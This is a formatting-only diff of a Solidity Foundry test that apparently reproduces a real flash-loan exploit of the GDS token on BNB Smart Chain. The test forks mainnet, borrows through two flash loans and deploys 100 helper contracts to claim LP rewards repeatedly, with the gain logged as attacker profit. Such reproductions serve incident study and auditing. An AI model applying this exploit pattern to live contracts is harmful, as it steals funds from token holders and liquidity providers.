@@ -11,25 +11,20 @@ import "./interface.sol";
 // https://bscscan.com/tx/0xf9b6cc083f6e0e41ce5e5dd65b294abf577ef47c7056d86315e5e53aa662251e
 // https://bscscan.com/tx/0x2bb704e0d158594f7373ec6e53dc9da6c6639f269207da8dab883fc3b5bf6694
 
-interface GDSToken is IERC20{
-    function pureUsdtToToken(uint256 _uAmount) external returns(uint256);
+interface GDSToken is IERC20 {
+    function pureUsdtToToken(uint256 _uAmount) external returns (uint256);
 }
 
-interface ISwapFlashLoan{
-    function flashLoan(
-        address receiver,
-        address token,
-        uint256 amount,
-        bytes memory params
-    ) external;
+interface ISwapFlashLoan {
+    function flashLoan(address receiver, address token, uint256 amount, bytes memory params) external;
 }
 
-interface IClaimReward{
+interface IClaimReward {
     function transferToken() external;
     function withdraw() external;
 }
 
-contract ClaimReward{
+contract ClaimReward {
     address Owner;
     GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
@@ -37,34 +32,29 @@ contract ClaimReward{
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     address deadAddress = 0x000000000000000000000000000000000000dEaD;
 
-    constructor(){
+    constructor() {
         Owner = msg.sender;
     }
 
-    function transferToken() external{
+    function transferToken() external {
         GDS.transfer(deadAddress, GDS.pureUsdtToToken(100 * 1e18));
         Pair.transfer(Owner, Pair.balanceOf(address(this)));
     }
 
-    function withdraw() external{
+    function withdraw() external {
         GDS.transfer(deadAddress, 10_000);
         Pair.transfer(Owner, Pair.balanceOf(address(this)));
-        GDS.approve(address(Router), type(uint).max);
-        address [] memory path = new address[](2);
+        GDS.approve(address(Router), type(uint256).max);
+        address[] memory path = new address[](2);
         path[0] = address(GDS);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            GDS.balanceOf(address(this)),
-            0,
-            path,
-            Owner,
-            block.timestamp
+            GDS.balanceOf(address(this)), 0, path, Owner, block.timestamp
         );
-
     }
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     GDSToken GDS = GDSToken(0xC1Bb12560468fb255A8e8431BDF883CC4cB3d278);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
@@ -72,16 +62,16 @@ contract ContractTest is DSTest{
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
     Uni_Pair_V2 Pair = Uni_Pair_V2(0x4526C263571eb57110D161b41df8FD073Df3C44A);
     address[] contractList;
-    uint PerContractGDSAmount;
-    uint SwapFlashLoanAmount;
-    uint dodoFlashLoanAmount;
+    uint256 PerContractGDSAmount;
+    uint256 SwapFlashLoanAmount;
+    uint256 dodoFlashLoanAmount;
     address deadAddress = 0x000000000000000000000000000000000000dEaD;
     address dodo = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 24449918); 
+        cheats.createSelectFork("bsc", 24_449_918);
         cheats.label(address(GDS), "GDS");
         cheats.label(address(USDT), "USDT");
     }
@@ -98,10 +88,12 @@ contract ContractTest is DSTest{
         cheats.roll(block.number + 1100);
         SwapFlashLoan();
 
-        emit log_named_decimal_uint("Attacker USDT balance after exploit", USDT.balanceOf(address(this)) - 50 * 250 * 1e18, USDT.decimals());
+        emit log_named_decimal_uint(
+            "Attacker USDT balance after exploit", USDT.balanceOf(address(this)) - 50 * 250 * 1e18, USDT.decimals()
+        );
     }
 
-    function SwapFlashLoan() internal{
+    function SwapFlashLoan() internal {
         SwapFlashLoanAmount = USDT.balanceOf(address(swapFlashLoan));
         swapFlashLoan.flashLoan(address(this), address(USDT), SwapFlashLoanAmount, new bytes(1));
     }
@@ -112,17 +104,17 @@ contract ContractTest is DSTest{
         uint256 amount,
         uint256 fee,
         bytes calldata params
-    ) external{
+    ) external {
         DODOFLashLoan();
-        USDT.transfer(address(swapFlashLoan), SwapFlashLoanAmount * 10000 / 9992 + 1000);
+        USDT.transfer(address(swapFlashLoan), SwapFlashLoanAmount * 10_000 / 9992 + 1000);
     }
 
-    function DODOFLashLoan() internal{
+    function DODOFLashLoan() internal {
         dodoFlashLoanAmount = USDT.balanceOf(dodo);
         DVM(dodo).flashLoan(0, dodoFlashLoanAmount, address(this), new bytes(1));
     }
 
-    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         USDTToGDS(600_000 * 1e18);
         GDSUSDTAddLiquidity(USDT.balanceOf(address(this)), GDS.balanceOf(address(this)));
         WithdrawRewardFactory();
@@ -131,73 +123,63 @@ contract ContractTest is DSTest{
         USDT.transfer(dodo, dodoFlashLoanAmount);
     }
 
-    function ClaimRewardFactory() internal{
-        for(uint i = 0; i < 100; i++){
+    function ClaimRewardFactory() internal {
+        for (uint256 i = 0; i < 100; i++) {
             ClaimReward claim = new ClaimReward();
             contractList.push(address(claim));
             Pair.transfer(address(claim), Pair.balanceOf(address(this)));
             GDS.transfer(address(claim), PerContractGDSAmount);
             claim.transferToken();
-        }        
+        }
     }
 
-    function WithdrawRewardFactory() internal{
-        for(uint i = 0; i < 100; i++){
+    function WithdrawRewardFactory() internal {
+        for (uint256 i = 0; i < 100; i++) {
             Pair.transfer(contractList[i], Pair.balanceOf(address(this)));
             IClaimReward(contractList[i]).withdraw();
         }
     }
 
-    function WBNBToUSDT() internal{
-        WBNB.approve(address(Router), type(uint).max);
-        address [] memory path = new address[](2);
+    function WBNBToUSDT() internal {
+        WBNB.approve(address(Router), type(uint256).max);
+        address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBNB.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 
-    function USDTToGDS(uint USDTAmount) internal{
-        USDT.approve(address(Router), type(uint).max);
-        address [] memory path = new address[](2);
+    function USDTToGDS(uint256 USDTAmount) internal {
+        USDT.approve(address(Router), type(uint256).max);
+        address[] memory path = new address[](2);
         path[0] = address(USDT);
         path[1] = address(GDS);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            USDTAmount,
-            0,
-            path,
-            address(this),
-            block.timestamp
+            USDTAmount, 0, path, address(this), block.timestamp
         );
     }
 
-    function GDSUSDTAddLiquidity(uint USDTAmount, uint GDSAmount) internal{
-        USDT.approve(address(Router), type(uint).max);
-        GDS.approve(address(Router), type(uint).max);
+    function GDSUSDTAddLiquidity(uint256 USDTAmount, uint256 GDSAmount) internal {
+        USDT.approve(address(Router), type(uint256).max);
+        GDS.approve(address(Router), type(uint256).max);
         Router.addLiquidity(address(USDT), address(GDS), USDTAmount, GDSAmount, 0, 0, address(this), block.timestamp);
     }
 
-    function GDSUSDTRemovLiquidity() internal{
-        Pair.approve(address(Router), type(uint).max);
-        Router.removeLiquidity(address(USDT), address(GDS), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp);
+    function GDSUSDTRemovLiquidity() internal {
+        Pair.approve(address(Router), type(uint256).max);
+        Router.removeLiquidity(
+            address(USDT), address(GDS), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp
+        );
     }
 
-    function GDSToUSDT() internal{
-        GDS.approve(address(Router), type(uint).max);
-        address [] memory path = new address[](2);
+    function GDSToUSDT() internal {
+        GDS.approve(address(Router), type(uint256).max);
+        address[] memory path = new address[](2);
         path[0] = address(GDS);
         path[1] = address(USDT);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            GDS.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            GDS.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 }
